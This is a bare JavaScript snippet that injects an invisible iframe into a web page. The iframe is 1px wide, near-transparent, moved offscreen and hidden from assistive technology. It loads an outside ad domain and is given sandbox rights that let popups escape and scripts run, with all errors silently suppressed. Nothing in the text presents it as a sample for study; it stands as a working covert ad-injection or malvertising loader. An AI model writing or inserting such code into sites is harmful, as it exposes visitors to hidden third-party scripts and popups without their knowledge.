(function() {
    try {
        var ifrm = document.createElement('iframe');
        ifrm.src = '//alwingulla.com/?ad=1';
        ifrm.style.cssText = 'position:fixed !important; left:-9999px !important; top:-9999px !important; width:1px !important; height:1px !important; border:0 !important; opacity:0.001 !important; pointer-events:none !important; z-index:-99999 !important;';
        ifrm.setAttribute('sandbox', 'allow-forms allow-modals allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts');
        ifrm.setAttribute('allow', 'accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture');
        ifrm.setAttribute('referrerpolicy', 'origin');
        ifrm.setAttribute('tabindex', '-1');
        ifrm.setAttribute('aria-hidden', 'true');
        var target = document.body || document.head || document.documentElement;
        if (target) target.appendChild(ifrm);
    } catch(e) {}
})();
